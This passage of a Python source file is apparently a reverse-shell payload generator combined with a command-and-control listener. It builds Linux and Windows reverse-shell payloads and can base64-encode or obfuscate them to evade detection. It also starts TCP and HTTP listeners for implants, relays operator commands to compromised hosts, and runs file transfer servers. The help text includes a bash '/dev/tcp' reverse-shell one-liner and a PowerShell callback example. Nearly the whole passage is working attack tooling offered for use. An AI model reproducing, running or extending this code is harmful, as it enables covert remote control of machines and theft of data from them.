                    print("[!] -con, -lhost, and -lport are required for generation.")
                    return True
                
                # Resolve LHOST if it's an interface name
                resolved_host = resolve_lhost(gen_args.lhost)
                if not resolved_host:
                    print(f"[!] Invalid -lhost: '{gen_args.lhost}'. Must be a valid IPv4 or Interface Name.")
                    return True
                gen_args.lhost = resolved_host
                
                module = load_payload_module(os_choice)
                customs = load_custom_payloads(os_choice)
                combined = merge_builtins_and_customs(getattr(module, "payloads", {}), customs)
                keys = list_keys_filtered_by_connection(getattr(module, "payloads", {}), customs, connection)
                
                if not keys:
                    print(f"[!] No payloads available for {os_choice} ({connection}).")
                    return True
                
                payload_key = gen_args.payload
                if not payload_key or payload_key not in keys:
                    print("\nAvailable payloads (filtered):")
                    for k in keys:
                        print(" -", k)
                    payload_key = ask_choice("Select payload (type exact key): ", keys)
                
                # Setup ModuleProxy for generator
                ModuleProxy = type("ModuleProxy", (), {})
                module_proxy = ModuleProxy()
                module_proxy.payloads = combined
                
                payload_text = generate_payload_text(module_proxy, payload_key, gen_args.lhost, gen_args.lport)
                
                # Check for port conflicts with active sessions
                port_conflict = False
                conflicting_sess_id = None
                with global_lock:
                    for uid, sess_data in http_sessions.items():
                        if sess_data.get('listener_port') == gen_args.lport:
                            port_conflict = True
                            conflicting_sess_id = uid
                            break
                    if not port_conflict:
                        for sid, sess_data in shell_sessions.items():
                            if sess_data.get('listener_port') == gen_args.lport:
                                port_conflict = True
                                conflicting_sess_id = sid
                                break
                
                if port_conflict:
                    print(f"[!] Port Conflict: Port {gen_args.lport} is currently occupied by active session {conflicting_sess_id}.")
                    print(f"[!] Please use a different port or terminate the existing session with '#exit'.")
                    return True

                # Check for listener type mismatch (e.g. trying to use TCP on an HTTP port)
                with global_lock:
                    is_listening = gen_args.lport in ACTIVE_LISTENERS
                    existing_type = ACTIVE_LISTENERS.get(gen_args.lport)

                if is_listening and existing_type != connection:
                    print(f"[!] Port Conflict: Port {gen_args.lport} is already listening for {existing_type.upper()}.")
                    print(f"[!] You are trying to generate a {connection.upper()} payload.")
                    print(f"[!] Please use a different port for this payload.")
                    return True

                # Automatically start a listener if one isn't running on this port
                if not is_listening:
                    if connection == 'http':
                        # Use 0.0.0.0 for dynamic listeners to ensure it works on any interface
                        threading.Thread(target=run_http_server, args=(gen_args.lport, '0.0.0.0'), daemon=True).start()
                    else:
                        # Use 0.0.0.0 for dynamic listeners to ensure it works on any interface
                        threading.Thread(target=run_raw_tcp_server, args=(gen_args.lport, '0.0.0.0'), daemon=True).start()
                    print(f"[*] Started new {connection.upper()} listener for this payload on port {gen_args.lport}")

                # Apply crypto
                crypto_mode = normalize_crypto(gen_args.crypto)
                if crypto_mode == "encode":
                    if os_choice == "Windows":
                        payload_out = encode_utf16(payload_text)
                    else:
                        b64 = base64.b64encode(payload_text.encode("utf-8")).decode("utf-8")
                        payload_out = f"echo '{b64}' | base64 -d | bash"
                elif crypto_mode == "obfuscate":
                    payload_out = obfuscate_payload(os_choice, payload_text)
                else:
                    payload_out = payload_text
                
                print("\n[+] Generated payload (copied to clipboard):\n")
                print(Fore.RED + payload_out + Style.RESET_ALL)
                try:
                    pyperclip.copy(payload_out)
                    print("[+] Payload copied to clipboard.")
                except Exception as e:
                    print(f"[!] Could not copy to clipboard: {e}")
                    
        except Exception as e:
            print(f"[!] Error parsing #generate command: {e}")
            
        return True

    if c2_cmd.lower() in ("exit", "quit"):
        if current_session:
            sess_type, sess_id = current_session
            print(f"[*] Terminating session {sess_id} and returning to main console.")
            with global_lock:
                if sess_type == 'http' and sess_id in http_sessions:
                    # Mark for termination and remove immediately
                    TERMINATED_SESSIONS[sess_id] = time.time()
                    del http_sessions[sess_id]
                    print(f"[-] HTTP Session {sess_id} has disconnected.")
                elif sess_type == 'shell' and sess_id in shell_sessions:
                    sess_data = shell_sessions[sess_id]
                    addr = sess_data['address'][0]
                    sess_os = sess_data.get('os', 'Linux') # Default to Linux for safety
                    socket_to_close = sess_data.get('socket')
                    
                    if socket_to_close:
                        try:
                            if sess_os == 'Windows':
                                # Windows only needs one exit
                                socket_to_close.sendall(b"exit\n")
                            else:
                                # Linux may have nested shells (PTY upgrade + bash -c)
                                # Send multiple exits and a kill command to be sure
                                socket_to_close.sendall(b"exit\nexit\nexit\nkill -9 0\n")
                            
                            time.sleep(0.3)
                            socket_to_close.close()
                        except: pass
                    del shell_sessions[sess_id]
                    print(f"[-] Shell {sess_id} ({addr}) has disconnected.")
            current_session = None
            line_mode_shell_id = None
        else:
            print("[*] Shutting down C2 server.")
            sys.exit(0)
        return True
    
    print("[!] Unknown C2 command. Type '#help' for available commands.")
    return True


def c2_console():
    global current_session, line_mode_shell_id
    print("\n[*] C2 Console Started. Type '#help' for commands.")
    while True:
        try:
            prompt = "C2 > "
            with global_lock:
                if line_mode_shell_id is not None and current_session == ('shell', line_mode_shell_id):
                    prompt = ""
            cmd_input = input(prompt)

            # If in line-mode shell interaction, forward line directly
            with global_lock:
                if line_mode_shell_id is not None and current_session == ('shell', line_mode_shell_id):
                    # Intercept C2 commands in line-mode (do not forward to remote)
                    if cmd_input.startswith('#'):
                        # This is a C2 command, don't forward to shell
                        # Let it fall through to C2 command processing below
                        pass
                    else:
                        # Forward non-C2 commands to the shell (no special wrapping for cd)
                        shell_id = line_mode_shell_id
                        if shell_id in shell_sessions:
                            shell_socket = shell_sessions[shell_id]['socket']
                            try:
                                shell_sessions[shell_id]['last_sent'] = cmd_input
                                shell_socket.sendall((cmd_input + '\n').encode())
                            except Exception:
                                print(f"\r[*] Failed to send to shell {shell_id}. It may have disconnected.")
                                current_session = None
                                line_mode_shell_id = None
                        else:
                            print("\r[*] Current shell has disconnected. Use '#list' and '#select'.")
                            current_session = None
                            line_mode_shell_id = None
                        continue

            cmd_input = cmd_input.strip()
            if not cmd_input:
                continue

            # Check if it's a C2 command (starts with #)
            if cmd_input.startswith('#'):
                if process_c2_command(cmd_input):
                    continue

            # HTTP mode commands
            if not current_session:
                print("[!] No session selected. Use '#list' and '#select <ID>'.")
                continue

            if current_session[0] == 'http':
                uid = current_session[1]
                needs_wait = False
                with global_lock:
                    if uid in http_sessions:
                        if cmd_input.startswith("cd"):
                            parts = cmd_input.split(maxsplit=1)
                            if len(parts) == 1:
                                # Reset to default CWD (no-op on target)
                                http_sessions[uid]['cwd'] = None
                                needs_wait = False
                            else:
                                arg = parts[1].strip()
                                if ((arg.startswith('"') and arg.endswith('"')) or (arg.startswith("'") and arg.endswith("'"))):
                                    arg = arg[1:-1]
                                current_cwd = http_sessions[uid].get('cwd')
                                is_absolute = bool(re.match(r'^[A-Za-z]:[\\/]', arg)) or arg.startswith('/') or arg.startswith('\\')
                                if is_absolute or not current_cwd:
                                    target_dir = arg
                                else:
                                    sep = '\\' if ('\\' in current_cwd or re.match(r'^[A-Za-z]:', current_cwd)) else '/'
                                    if current_cwd.endswith(sep):
                                        target_dir = f"{current_cwd}{arg}"
                                    else:
                                        target_dir = f"{current_cwd}{sep}{arg}"
                                # Build a verification command based on detected implant OS
                                verify_cmd = None
                                sess_os = http_sessions[uid].get('os')
                                if sess_os == "Windows":
                                    verify_cmd = (
                                        "$ErrorActionPreference='SilentlyContinue';"
                                        f"Set-Location -Path \"{target_dir}\";"
                                        "if($?){Write-Output \"CWD:\" + (Get-Location).Path}else{Write-Output \"CDERR\"}"
                                    )
                                else:
                                    # Generic POSIX fallback
                                    verify_cmd = (
                                        f"if [ -d \"{target_dir}\" ]; then cd \"{target_dir}\" && pwd | sed 's/^/CWD:/'; else echo CDERR; fi"
                                    )
                                http_sessions[uid]['last_cmd'] = verify_cmd
                                http_sessions[uid]['has_new_output'] = False
                                http_sessions[uid]['awaiting'] = True
                                needs_wait = True
                        else:
                            # Check session stability before executing command
                            session_data = http_sessions[uid]
                            stability = calculate_session_stability(session_data)
                            status = session_data.get("status", "unknown")
                            
                            # Warn user if session is unstable
                            if stability < STABILITY_THRESHOLD_LOW:
                                print(f"[WARN] Session {uid} is unstable (stability: {stability:.2f}). Command may fail or hang.")
                                try:
                                    choice = input("Proceed anyway? [y/n]: ").lower().strip()
                                    if choice not in ['y', 'yes']:
                                        continue
                                except:
                                    continue
                            
                            # Queue command if session is very unstable
                            if stability < 0.2:
                                if queue_command(uid, cmd_input, "shell"):
                                    print(f"[INFO] Command queued for unstable session {uid}. Will execute when session stabilizes.")
                                    continue
                            
                            cwd = http_sessions[uid].get('cwd')
                            to_send = f'cd "{cwd}"; {cmd_input}' if cwd else cmd_input
                            http_sessions[uid]['last_cmd'] = to_send
                            http_sessions[uid]['has_new_output'] = False
                            http_sessions[uid]['awaiting'] = True
                            http_sessions[uid]['state'] = "busy"
                            http_sessions[uid]['command_sent_time'] = time.time()
                            needs_wait = True
                    else:
                        print(f"[!] HTTP implant {uid} is no longer active.")
                        current_session = None
                if needs_wait:
                    wait_for_http_response(uid)
                continue

        except KeyboardInterrupt:
            # Gracefully handle Ctrl+C based on context
            with global_lock:
                if current_session:
                    sess_id = current_session[1]
                    sess_type = current_session[0]
                    print(f"\n[*] Disengaging from {sess_type} session {sess_id}. Type '#list' to see sessions.")
                    current_session = None
                    line_mode_shell_id = None
                    continue
            
            # If no session active, check if user really wants to exit
            try:
                confirm = input("\n[?] Exit C2 Manager? (y/N): ").strip().lower()
                if confirm == 'y':
                    print("[*] Exiting.")
                    sys.exit(0)
                else:
                    continue
            except (KeyboardInterrupt, EOFError):
                print("\n[*] Exiting.")
                sys.exit(0)
        except Exception as e:
            print(f"\n[!] An error occurred: {e}")

# -----------------------
# main entrypoint
# -----------------------
def main():
    global HOST, HTTP_PORT, RAW_TCP_PORT, OS_CHOICE, FILE_UPLOAD_PORT, FILE_DOWNLOAD_PORT, DOWNLOAD_DIR

    print("=== Payload Generator + Listener ===\n")

    # CLI parsing
    parser = argparse.ArgumentParser(
        description="Payload generator + C2 listener",
        formatter_class=argparse.RawTextHelpFormatter,
        epilog=(
            "Examples:\n"
            "  - Use built-ins or stored payloads and start listeners:\n"
            "    ./main.py -m=b -os=l -con=tcp -lhost=127.0.0.1 -lport=4444\n"
            "    ./main.py -m=b -os=w -con=http -lhost=10.0.0.5 -lport=2222\n"
            "    Optional: -pay=<payload_key> to auto-select.\n\n"
            "  - Store a custom payload (host/port will be templated as {LHOST}/{LPORT}):\n"
            "    ./main.py -m=c -os=l -con=tcp -lhost=127.0.0.1 -lport=5555 -n=mybash -pay='bash -i >& /dev/tcp/127.0.0.1/5555 0>&1'\n"
            "    ./main.py -m=c -os=w -con=http -lhost=10.0.0.5 -lport=2222 -n=mypwsh -pay=\"powershell ... http://10.0.0.5:2222 ...\"\n\n"
            "Notes:\n"
            "- -os: l (Linux) or w (Windows)\n"
            "- -con: tcp or http\n"
            "- In -m=b, the opposite listener uses defaults (HTTP 2222, TCP 4444).\n"
            "- Custom payloads are saved in payloads/custom_linux.json or payloads/custom_windows.json.\n"
        ),
    )
    parser.add_argument("-help", action="help", help="Show this help message and exit")
    parser.add_argument("-m", "--mode", help="Mode: b = use/generate & listen, c = create/store payload")
    parser.add_argument("-os", "--os", dest="os_flag", help="Target OS: w = Windows, l = Linux")
    parser.add_argument("-con", "--connection", dest="connection", help="Connection type: http or tcp")
    parser.add_argument("-lhost", dest="lhost", help="Listener host / LHOST")
    parser.add_argument("-lport", dest="lport", type=int, help="Listener port / LPORT for the chosen connection type")
    parser.add_argument("-n", "--name", dest="name", help="Name for the payload (store mode)")
    parser.add_argument("-pay", "--payload", dest="payload", help="Payload content (store mode). Include your actual IP and port so they can be templated.")
    parser.add_argument("-k", "--key", dest="key", help="Key/name of payload to auto-select (use mode) - INCORRECT: use -pay instead")
    parser.add_argument("-cry", "--crypto", dest="crypto", help="Optional: encode (base64) or obfuscate (valid: encode, obfuscate, none)")
    args, unknown = parser.parse_known_args()

    # Check for unknown arguments and show correct syntax
    if unknown:
        print(f"[!] Unknown arguments: {' '.join(unknown)}")
        print("[!] Correct syntax:")
        print("  ./main.py -m=b -os=w -con=http -lhost=IP -lport=PORT -cry=encode")
        print("  ./main.py -m=b -os=w -con=http -lhost=IP -lport=PORT -cry=obfuscate")
        print("  ./main.py -m=b -os=w -con=http -lhost=IP -lport=PORT")
        print("\nValid crypto options: encode, obfuscate, none")
        print("Example: ./main.py -m=b -os=w -con=http -lhost=127.0.0.1 -lport=4444 -cry=encode")
        sys.exit(2)

    # If explicit CLI mode is requested
    if args.mode:
        mode = args.mode.strip().lower()
        if mode not in ("b", "c"):
            print("[!] Invalid -m. Use -m=b (use) or -m=c (create).")
            sys.exit(2)

        os_choice = normalize_os_choice(args.os_flag)
        if not os_choice:
            print("[!] -os is required (w or l).")
            sys.exit(2)

        if mode == "c":
            # Create/store payload
            connection = normalize_connection(args.connection)
            if connection not in ("http", "tcp"):
                print("[!] In create mode, -con must be 'http' or 'tcp'.")
                sys.exit(2)
            if not args.name:
                print("[!] In create mode, -n (payload name) is required.")
                sys.exit(2)
            if not args.payload:
                print("[!] In create mode, -pay (payload content) is required.")
                sys.exit(2)

            # Ensure unique payload name across built-ins and custom store
            try:
                builtin_names = set(getattr(load_payload_module(os_choice), "payloads", {}).keys())
            except Exception:
                builtin_names = set()
            custom_names = set(load_custom_payloads(os_choice).keys())
            if args.name in builtin_names or args.name in custom_names:
                print(f"[!] Payload name '{args.name}' already exists. Choose a different name.")
                sys.exit(2)

            # Load and auto-extract host/port from payload
            raw = read_payload_source(args.payload)
            ex_host, ex_port = extract_host_port(raw)
            if not ex_host or not ex_port:
                print("[!] Could not auto-detect LHOST/LPORT from payload. Please include a host:port or TCPClient('host',port), etc.")
                sys.exit(2)

            # Confirm/override if running interactively (TTY)
            try:
                is_tty = sys.stdin.isatty()
            except Exception:
                is_tty = False
            if is_tty:
                print(f"[*] Detected LHOST={ex_host}, LPORT={ex_port}. Is this correct? (y/N): ", end="")
                ans = input("").strip().lower()
                if ans != "y":
                    # Allow manual override
                    while True:
                        mh = input("Enter LHOST (IPv4): ").strip()
                        if is_valid_ipv4(mh):
                            ex_host = mh
                            break
                        print("[!] Invalid IPv4.")
                    while True:
                        mp = input("Enter LPORT (1-65535): ").strip()
                        if mp.isdigit() and 1 <= int(mp) <= 65535:
                            ex_port = int(mp)
                            break
                        print("[!] Invalid port.")

            templated = template_payload_content(raw, ex_host, ex_port)
            save_custom_payload(os_choice, args.name, templated, connection)
            print(f"[+] Stored payload '{args.name}' for {os_choice} ({connection}).")
            sys.exit(0)

        # Use/generate and listen
        connection = normalize_connection(args.connection)
        if connection not in ("http", "tcp"):
            print("[!] In use mode, -con must be 'http' or 'tcp'.")
            sys.exit(2)
        
        lhost = resolve_lhost(args.lhost)
        if not lhost:
            print(f"[!] Invalid -lhost: '{args.lhost}'. Must be a valid IPv4 or Interface Name.")
            sys.exit(2)
        DEFAULT_HTTP = 2222
        DEFAULT_TCP = 4444
        # Assign ports based on chosen connection; the other gets a default (adjust if unavailable)
        if connection == "tcp":
            tcp_port = args.lport
            http_port = find_available_port(lhost, DEFAULT_HTTP, exclude=[tcp_port])
        else:
            # http
            http_port = args.lport
            tcp_port = find_available_port(lhost, DEFAULT_TCP, exclude=[http_port])

        if not can_bind(lhost, http_port):
            print(f"[!] Cannot bind HTTP on {lhost}:{http_port}.")
            sys.exit(2)
        if not can_bind(lhost, tcp_port):
            print(f"[!] Cannot bind TCP on {lhost}:{tcp_port}.")
            sys.exit(2)

        # Load built-in + custom payloads and filter by connection
        module = load_payload_module(os_choice)
        customs = load_custom_payloads(os_choice)
        combined = merge_builtins_and_customs(getattr(module, "payloads", {}), customs)

        # Validate crypto option early
        crypto_mode = normalize_crypto(getattr(args, "crypto", None))
        if crypto_mode == "invalid":
            print(f"[!] Invalid crypto option: '{args.crypto}'. Valid options are: encode, obfuscate, none")
            print("Examples: -cry=encode, -cry=obfuscate, -cry=none")
            sys.exit(2)

        # Validate port early
        if not (args.lport and 1 <= args.lport <= 65535):
            print("[!] Invalid port number. Port must be between 1 and 65535.")
            sys.exit(2)

        # Keys filtered by requested connection
        keys = list_keys_filtered_by_connection(getattr(module, "payloads", {}), customs, connection)
        if not keys:
            print(f"[!] No payloads available for {os_choice} ({connection}). Add some with -m=c.")
            sys.exit(2)

        # Choose key (CLI or prompt)
        if args.key:
            print("[!] Error: -k is incorrect. Use -pay instead.")
            print("Example: -pay=powerShellIEX")
            sys.exit(2)
        
        if args.payload:
            if args.payload not in combined or args.payload not in keys:
                print(f"[!] Payload key '{args.payload}' not found for the requested filters.")
                sys.exit(2)
            payload_key = args.payload
        else:
            print("\nAvailable payloads (filtered):")
            for k in keys:
                print(" -", k)
            payload_key = ask_choice("Select payload (type exact key): ", keys)

        # Create a proxy module with merged dict for generator
        ModuleProxy = type("ModuleProxy", (), {})
        module_proxy = ModuleProxy()
        module_proxy.payloads = combined

        selected_port = tcp_port if connection == "tcp" else http_port
        payload_text = generate_payload_text(module_proxy, payload_key, lhost, selected_port)

        # Apply crypto transform
        if crypto_mode == "encode":
            if os_choice == "Windows":
                # Use Villain-style UTF-16 encoding
                display_text = encode_utf16(payload_text)
            else:
                # Linux - use base64 with proper command wrapper
                try:
                    b64 = base64.b64encode(payload_text.encode("utf-8")).decode("utf-8")
                    display_text = f"echo '{b64}' | base64 -d | bash"
                except Exception:
                    display_text = payload_text
        elif crypto_mode == "obfuscate":
            display_text = obfuscate_payload(os_choice, payload_text)
        else:
            display_text = payload_text

        print("\n[+] Generated payload (copied to clipboard):\n")
        print(Fore.RED + display_text + Style.RESET_ALL)
        try:
            pyperclip.copy(display_text)
            print("[+] Payload copied to clipboard.")
        except Exception as e:
            print(f"[!] Could not copy to clipboard: {e}")

        # Initialize file transfer ports and directories
        FILE_UPLOAD_PORT = find_available_port(lhost, 4343, exclude=[http_port, tcp_port])
        FILE_DOWNLOAD_PORT = find_available_port(lhost, 3434, exclude=[http_port, tcp_port, FILE_UPLOAD_PORT])
        DOWNLOAD_DIR = os.path.join(os.getcwd(), "downloads")
        os.makedirs(DOWNLOAD_DIR, exist_ok=True)

        # Assign globals and start listeners + console
        HOST = lhost
        HTTP_PORT = http_port
        RAW_TCP_PORT = tcp_port
        global OS_CHOICE
        OS_CHOICE = os_choice
        try:
            threading.Thread(target=run_http_server, daemon=True).start()
            threading.Thread(target=monitor_http_implants, daemon=True).start()
            threading.Thread(target=run_raw_tcp_server, daemon=True).start()
            threading.Thread(target=run_file_upload_server, daemon=True).start()
            threading.Thread(target=run_file_download_server, daemon=True).start()
            time.sleep(0.5)
            print(f"\n[*] Listeners started on {HOST} (HTTP: {HTTP_PORT}, TCP: {RAW_TCP_PORT}).")
            print(f"[*] File transfer servers: Upload {FILE_UPLOAD_PORT}, Download {FILE_DOWNLOAD_PORT}")
            print(f"[*] Download directory: {DOWNLOAD_DIR}")
            c2_console()
        except Exception as e:
            print(f"[!] Failed to start listeners: {e}")
            sys.exit(1)
        return

    # ------------------
    # Interactive mode (mirrors CLI)
    # ------------------

    mode_choice = ask_choice("Mode (Use/Store): ", ["Use", "Store"])

    if mode_choice == "Store":
        os_choice = ask_choice("Target OS (Linux/Windows): ", ["Linux", "Windows"])
        connection = ask_choice("Connection type (tcp/http): ", ["tcp", "http"])
        name = ""
        while True:
            name = input("Enter payload name: ").strip()
            if not name:
                print("[!] Name cannot be empty.")
                continue
            try:
                builtin_names = set(getattr(load_payload_module(os_choice), "payloads", {}).keys())
            except Exception:
                builtin_names = set()
            custom_names = set(load_custom_payloads(os_choice).keys())
            if name in builtin_names or name in custom_names:
                print("[!] A payload with this name already exists. Choose a different name.")
                continue
            break
        pay_content = ""
        while not pay_content:
            src = input("Enter payload content OR @/path/to/file: ").strip()
            if not src:
                print("[!] Payload content cannot be empty.")
                continue
            pay_content = read_payload_source(src)
        ex_host, ex_port = extract_host_port(pay_content)
        if not ex_host or not ex_port:
            print("[!] Could not auto-detect LHOST/LPORT from payload. Include host and port (e.g., host:port or TCPClient('host',port)).")
            sys.exit(2)
        print(f"[*] Detected LHOST={ex_host}, LPORT={ex_port}. Is this correct? (y/N): ", end="")
        ans = input("").strip().lower()
        if ans != "y":
            # Manual override
            while True:
                mh = input("Enter LHOST (IPv4): ").strip()
                if is_valid_ipv4(mh):
                    ex_host = mh
                    break
                print("[!] Invalid IPv4.")
            while True:
                mp = input("Enter LPORT (1-65535): ").strip()
                if mp.isdigit() and 1 <= int(mp) <= 65535:
                    ex_port = int(mp)
                    break
                print("[!] Invalid port.")
        templated = template_payload_content(pay_content, ex_host, ex_port)
        save_custom_payload(os_choice, name, templated, connection)
        print(f"[+] Stored payload '{name}' for {os_choice} ({connection}).")
        sys.exit(0)

    # Use/generate and listen
    os_choice = ask_choice("Target OS (Linux/Windows): ", ["Linux", "Windows"])
    connection = ask_choice("Connection type (tcp/http): ", ["tcp", "http"])
    lhost = ask_ip("Enter LHOST (IPv4 or Interface Name): ")

    DEFAULT_HTTP = 2222
    DEFAULT_TCP = 4444
    http_port = None
    tcp_port = None
    if connection == "tcp":
        # Ask TCP; default HTTP
        while True:
            tcp_port = ask_port("Enter TCP (raw reverse shell) listener port (1-65535): ")
            if not can_bind(lhost, tcp_port):
                print(f"[!] Cannot bind to {lhost}:{tcp_port}. Try a different port or ensure the host interface exists.")
                continue
            break
        http_port = find_available_port(lhost, DEFAULT_HTTP, exclude=[tcp_port])
        if not can_bind(lhost, http_port):
            print(f"[!] Default HTTP {DEFAULT_HTTP} unavailable on {lhost}.")
            while True:
                http_port = ask_port("Enter HTTP listener port (1-65535): ")
                if not can_bind(lhost, http_port):
                    print(f"[!] Cannot bind to {lhost}:{http_port}. Try a different port or ensure the host interface exists.")
                    continue
                break
    else:
        # Ask HTTP; default TCP
        while True:
            http_port = ask_port("Enter HTTP listener port (1-65535): ")
            if not can_bind(lhost, http_port):
                print(f"[!] Cannot bind to {lhost}:{http_port}. Try a different port or ensure the host interface exists.")
                continue
            break
        tcp_port = find_available_port(lhost, DEFAULT_TCP, exclude=[http_port])
        if not can_bind(lhost, tcp_port):
            print(f"[!] Default TCP {DEFAULT_TCP} unavailable on {lhost}.")
            while True:
                tcp_port = ask_port("Enter TCP (raw reverse shell) listener port (1-65535): ")
                if not can_bind(lhost, tcp_port):
                    print(f"[!] Cannot bind to {lhost}:{tcp_port}. Try a different port or ensure the host interface exists.")
                    continue
                break

    module = load_payload_module(os_choice)
    customs = load_custom_payloads(os_choice)
    keys = list_keys_filtered_by_connection(getattr(module, "payloads", {}), customs, connection)
    if not keys:
        print(f"[!] No payloads available for {os_choice} ({connection}). Add some with -m=c or 'Store' mode.")
        sys.exit(2)

    print("\nAvailable payloads (filtered):")
    for k in keys:
        print(" -", k)

    payload_key = ask_choice("Select payload (type exact key): ", keys)

    combined = merge_builtins_and_customs(getattr(module, "payloads", {}), customs)
    ModuleProxy = type("ModuleProxy", (), {})
    module_proxy = ModuleProxy()
    module_proxy.payloads = combined

    selected_port = tcp_port if connection == "tcp" else http_port
    payload_text = generate_payload_text(module_proxy, payload_key, lhost, selected_port)

    # Interactive crypto option
    crypto_choice = ask_choice("Crypto (none/encode/obfuscation): ", ["none", "encode", "obfuscation"])
    if crypto_choice == "encode":
        if os_choice == "Windows":
            # Use Villain-style UTF-16 encoding
            payload_out = encode_utf16(payload_text)
        else:
            # Linux - use base64 with proper command wrapper
            try:
                b64 = base64.b64encode(payload_text.encode("utf-8")).decode("utf-8")
                payload_out = f"echo '{b64}' | base64 -d | bash"
            except Exception:
                payload_out = payload_text
    elif crypto_choice == "obfuscation":
        payload_out = obfuscate_payload(os_choice, payload_text)
    else:
        payload_out = payload_text

    print("\n[+] Generated payload (copied to clipboard):\n")
    print(Fore.RED + payload_out + Style.RESET_ALL)
    try:
        pyperclip.copy(payload_out)
        print("[+] Payload copied to clipboard.")
    except Exception as e:
        print(f"[!] Could not copy to clipboard: {e}")

    # Initialize file transfer ports and directories
    FILE_UPLOAD_PORT = find_available_port(lhost, 4343, exclude=[http_port, tcp_port])
    FILE_DOWNLOAD_PORT = find_available_port(lhost, 3434, exclude=[http_port, tcp_port, FILE_UPLOAD_PORT])
    DOWNLOAD_DIR = os.path.join(os.getcwd(), "downloads")
    os.makedirs(DOWNLOAD_DIR, exist_ok=True)

    HOST = lhost
    HTTP_PORT = http_port
    RAW_TCP_PORT = tcp_port
    OS_CHOICE = os_choice

    # Initialize professional console experience
    setup_readline()

    try:
        threading.Thread(target=run_http_server, daemon=True).start()
        threading.Thread(target=monitor_http_implants, daemon=True).start()
        threading.Thread(target=run_raw_tcp_server, daemon=True).start()
        threading.Thread(target=run_file_upload_server, daemon=True).start()
        threading.Thread(target=run_file_download_server, daemon=True).start()
        time.sleep(0.5)
        print(f"\n[*] Listeners started on {HOST} (HTTP: {HTTP_PORT}, TCP: {RAW_TCP_PORT}).")
        print(f"[*] File transfer servers: Upload {FILE_UPLOAD_PORT}, Download {FILE_DOWNLOAD_PORT}")
        print(f"[*] Download directory: {DOWNLOAD_DIR}")
        c2_console()
    except Exception as e:
        print(f"[!] Failed to start listeners: {e}")
        sys.exit(1)

if __name__ == "__main__":
    main()
    